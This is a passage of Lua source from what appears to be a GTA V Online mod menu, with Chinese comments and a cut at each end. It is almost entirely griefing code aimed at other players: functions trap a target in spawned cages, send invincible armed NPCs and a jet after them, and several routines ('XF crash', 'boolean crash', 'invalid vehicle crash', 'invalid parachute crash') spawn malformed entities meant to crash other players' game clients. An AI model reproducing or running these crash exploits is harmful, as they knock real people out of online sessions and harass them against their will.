        elseif index == 2 then 
            v_hash = util.joaat("cargobob")
        end

        local user_ped = PLAYER.GET_PLAYER_PED(pid)
        request_model(v_hash)
        request_model(p_hash)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(user_ped, 0.0, 2.0, 0.0)
        local truck = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(user_ped))
        local driver = entities.create_ped(5, p_hash, c, 0)
        PED.SET_PED_INTO_VEHICLE(driver, truck, -1)
        PED.SET_PED_FLEE_ATTRIBUTES(driver, 0, false)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        ENTITY.SET_ENTITY_INVINCIBLE(truck, true)
        request_model(prop_hash)
        PED.SET_PED_CAN_BE_DRAGGED_OUT(driver, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        util.yield(2000)
        if index == 1 then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(driver, truck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(truck), 786996, 5, 0)
        elseif index == 2 then 
            TASK.TASK_HELI_MISSION(driver, truck, 0, 0, math.random(1000), math.random(1000), 1500, 4, 200.0, 0.0, 0, 100, 1000, 0.0, 16)
        end
end
----缆车笼子
function tramway_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = util.joaat("p_cablecar_s")
    local pos = players.get_position(pid)
    local obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y - 0.1, pos.z + 4.2, true, false, false)
    ENTITY.FREEZE_ENTITY_POSITION(obj, true)
end
----小桶笼子
function Kegs_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local container_hash = util.joaat("prop_feeder1_cr")
    local pos = players.get_position(pid)
    entities.create_object(container_hash, v3(pos.x, pos.y, pos.z - 1))
    entities.create_object(container_hash, v3(pos.x, pos.y, pos.z + 1))
end
-----电击笼子
function Shock_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local pos = players.get_position(pid)
    pos.z = pos.z - 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
            obj_pos.z = obj_pos.z + 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
----英国女王笼子
function gueencage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z = obj_pos.z + 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
----燃气笼
function gascage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z = pos.z - 1
    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z = pos.z + 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end
----集装箱笼子
function Container_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local container_hash = util.joaat("prop_container_ld_pu")
    local pos = players.get_position(pid)
    request_model(container_hash)
    pos.z = pos.z - 1
    local container = entities.create_object(container_hash, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
-----隐形笼子
function Vehicle_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = players.get_position(pid)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
-----关门放狗
function Close_dog(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = 779277682
    request_model(hash)
    local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
    local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
    util.yield(100)
    for i = 1, 20 do
        send_attacker(-1788665315, pid, false)
        util.yield(1)
    end
end
----恐怖之牢
function Terror_Prison(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = 779277682
    request_model(hash)
    local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
    local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
    util.yield(100)
    for i = 1, 20 do
        send_attacker(util.joaat("CS_BradCadaver"), pid, false)
        util.yield(1)
    end
end
------小的竞技管
function Small_athletics(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = 779277682
    request_model(hash)
    local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
    local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
end
-----竖向货机笼子
function Vertical_freighter_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 0.0, 5.0)
    --local hash = util.joaat("prop_ld_crate_01")
    local hash = util.joaat('titan')
    request_model(hash)
    local cage = entities.create_vehicle(hash, coords, 0)
    ENTITY.SET_ENTITY_ROTATION(cage, 90, 0, 0, 1, true)
    --ENTITY.FREEZE_ENTITY_POSITION(cage, true)
    ENTITY.SET_ENTITY_INVINCIBLE(cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(cage, true)
end
-------横行货机笼子
function Rampage_plane_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 0.0, 0.0)
    local hash = util.joaat("cargoplane")
    request_model(hash)
    local cargo = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(ped))
    ENTITY.FREEZE_ENTITY_POSITION(cargo, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(cargo, coords.x, coords.y, coords.z-0.1, true, false, false)
    ENTITY.SET_ENTITY_INVINCIBLE(cargo, true)
    for i=1, 5 do
        VEHICLE.SET_VEHICLE_DOOR_LATCHED(cargo, i, true, true, true)
    end
end
----支柱笼子
function rub_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local hash = 2063962179
	pos.z = pos.z - 1
	local object1 = create_object(hash, pos.x, pos.y, pos.z)
    local object2 = create_object(hash, pos.x, pos.y, pos.z)
    ENTITY.SET_ENTITY_ROTATION(object1, 0, 0, 0, 1, true)
    ENTITY.SET_ENTITY_ROTATION(object2, 0, 0, 90, 1, true)																
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
    ENTITY.FREEZE_ENTITY_POSITION(object2, true)
end

------天煞战斗机
function Celestial_Fighter(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = util.joaat("lazer")
    request_model(hash)
    request_model(-163714847)
    coords.x = coords.x + 2
    coords.y = coords.y + 2
    local jet = entities.create_vehicle(hash, coords, 0.0)
    VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(jet)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(jet))
    ENTITY.SET_ENTITY_INVINCIBLE(jet, true)
    local pilot = entities.create_ped(28, -163714847, coords, 30.0)
    PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 5, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 46, true)
    PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
    TASK.TASK_PLANE_MISSION(pilot, jet, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
    TASK.TASK_COMBAT_PED(pilot, target_ped, 0, 16)
    PED.SET_PED_ACCURACY(pilot, 100.0)
    PED.SET_PED_COMBAT_ABILITY(pilot, 2)
end



----XF崩溃
function XF_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        request_model(-930879665)
        util.yield(10)
        request_model(3613262246)
        util.yield(10)
        request_model(452618762)
        util.yield(10)
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        delete_entity(a1)
        delete_entity(a2)
        delete_entity(b1)
        delete_entity(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        util.yield(10)
    end
end

----布尔值崩溃
function boolean_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(ped)
    local model = util.joaat("banshee")
    request_model(model)
    local vehicle = entities.create_vehicle(model,coords,0)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
    VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
    for i=0, 49 do
        local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
    end
end

----无效载具崩溃
function clone(vehicle)
    local vehicleHeading<const> = ENTITY.GET_ENTITY_HEADING(vehicle)
    local vehicleHash<const> = ENTITY.GET_ENTITY_MODEL(vehicle)
    local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle)
    local rot = v3.toDir(ENTITY.GET_ENTITY_ROTATION(vehicle, 2))
    v3.mul(rot, -getDimensions(vehicle).x - 2)
    v3.add(coords, rot)
    local cloneVehicle<const> = entities.create_vehicle(vehicleHash, coords, vehicleHeading)
    copyVehicleData(vehicle, cloneVehicle)
    return cloneVehicle
end
function getDimensions(entity)
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
    local minimum_vec<const> = v3.new(minimum)
    local maximum_vec<const> = v3.new(maximum)
    local dimensions<const> = {
        x = maximum_vec.y - minimum_vec.y,
        y = maximum_vec.x - minimum_vec.x,
        z = maximum_vec.z - minimum_vec.z
    }
    return dimensions
end
local colorR, colorG, colorB = memory.alloc(1), memory.alloc(1), memory.alloc(1)
function copyVehicleData(vehicle, cloneVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(cloneVehicle, 0)
    for i = 17, 22 do
        VEHICLE.TOGGLE_VEHICLE_MOD(cloneVehicle, i, VEHICLE.IS_TOGGLE_MOD_ON(vehicle, i))
    end
    for i = 0, 49 do
        local modValue<const> = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(cloneVehicle, i, modValue)
    end
    if VEHICLE.GET_IS_VEHICLE_PRIMARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_1(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    end
    if VEHICLE.GET_IS_VEHICLE_SECONDARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_2(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    end
    VEHICLE.GET_VEHICLE_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_5(vehicle, colorR) -- interior
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_6(vehicle, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(cloneVehicle, memory.read_ubyte(colorR)) -- dashboard
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(cloneVehicle, memory.read_ubyte(colorG)) -- interior
    VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    VEHICLE.GET_VEHICLE_NEON_COLOUR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(cloneVehicle, i, VEHICLE.GET_VEHICLE_NEON_ENABLED(vehicle, i))
    end
    local windowTint<const> = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(cloneVehicle, windowTint)
    local lightsColor<const> = VEHICLE.GET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(cloneVehicle, lightsColor)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle))
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(cloneVehicle, VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle))
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(cloneVehicle, VEHICLE.GET_VEHICLE_DIRT_LEVEL(vehicle))
    for i = 1, 14 do
        VEHICLE.SET_VEHICLE_EXTRA(cloneVehicle, i, not VEHICLE.IS_VEHICLE_EXTRA_TURNED_ON(vehicle, i))
    end
    local roofState<const> = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
    if roofState == 1 or roofState == 2 then
        VEHICLE.LOWER_CONVERTIBLE_ROOF(cloneVehicle, true)
    end
    VEHICLE.SET_VEHICLE_ENGINE_ON(cloneVehicle, VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(vehicle), true, true)
end
function Invalid_vehicle_crashes(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pCoords = players.get_position(pid)
    local trafficLights = {}
    util.request_model(-655644382) -- traffic lights
    for i = 1, 20 do
        local object = entities.create_object(-655644382, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
        ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
        trafficLights[#trafficLights + 1] = object
    end
    local stopLights = false
    util.create_tick_handler(function()
        if stopLights then
            return false
        end
        ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
    end)
    util.request_model(3253274834) -- buffalo
    local vehicles = {}
    local crashVehicle<const> = entities.create_vehicle(3253274834, pCoords, 0)
    vehicles[#vehicles + 1] = crashVehicle
    VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(crashVehicle, "ICRASHU")
    VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
    for i = 1, 10 do
        vehicles[#vehicles + 1] = clone(crashVehicle)
    end
    util.yield(500)
    for i = 1, #vehicles do
        delete_entity(vehicles[i])
    end
    util.yield(500)
    stopLights = true
    util.yield(500)
    for i = 1, #trafficLights do
        delete_entity(trafficLights[i])
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
end
--------崩溃XP
function xp_over(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local fuck_ped = create_ped(26 , util.joaat("ig_kaylee"), BAD_attach.x, BAD_attach.y, BAD_attach.z, 0)
    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
    for i = 1, 3, 1 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
        for spawn, value in pairs(model_array) do
            local vels = {}
            vels[spawn] = create_vehicle(value, BAD_attach.x, BAD_attach.y, BAD_attach.z, 0)
            for attach, val in pairs(vels) do
                ENTITY1.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(val, fuck_ped, 0, 0, true, true)
            end
        end
        util.yield(500)
        menu.trigger_commands("explode" ..  players.get_name(pid))
    end
end


-----无效降落伞崩溃
function rotatePoint(x, y, center, degrees)
    local radians = math.rad(degrees)
    local new_x = (x - center.x) * math.cos(radians) - (y - center.y) * math.sin(radians)
    local new_y = (x - center.x) * math.sin(radians) + (y - center.y) * math.cos(radians)
    return center.x + new_x, center.y + new_y * 1920 / 1080
end
function Invalid_parachute()
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0)
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    local user = PLAYER.PLAYER_ID()
    local user_ped = PLAYER.PLAYER_PED_ID()
    local pos = players.get_position(user)
    local spped = PLAYER.PLAYER_PED_ID()
    local ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(100)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	3235319999)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        delete_entity(Ruiner2)
    end
    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 2000, false, true, true)
        util.yield(120)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(120)
        delete_entity(Ruiner2)
    end
    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(100)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	546252211)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        delete_entity(Ruiner2)
    end
    for i = 1, 8 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 800, false, true, true)
        util.yield(200)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	148511758)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        delete_entity(Ruiner2)
    end
    for i = 1, 10 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 500, false, true, true)
        util.yield(100)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	260873931)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(100)
        delete_entity(Ruiner2)
    end
    util.yield(200)
    for i = 1, 5 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 300, false, true, true)
        util.yield(500)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 1381105889)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(500)
        delete_entity(Ruiner2)
    end
    for i = 1, 25 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
        local Ruiner2 = create_vehicle(util.joaat("Ruiner2"), SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, ENTITY.GET_ENTITY_HEADING(TTPed))
        ENTITY.SET_ENTITY_INVINCIBLE(Ruiner2, true)
        PED.SET_PED_INTO_VEHICLE(spped, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 200, false, true, true)
        util.yield(150)
        VEHICLE1._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, 	1500925016)
        VEHICLE1._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(150)
        delete_entity(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    for n = 0 , 2 do
        local object_hash = util.joaat("prop_logpile_06b")
        request_model(object_hash)
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,100, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        util.yield(800)
        for i = 0 , 1 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(800)
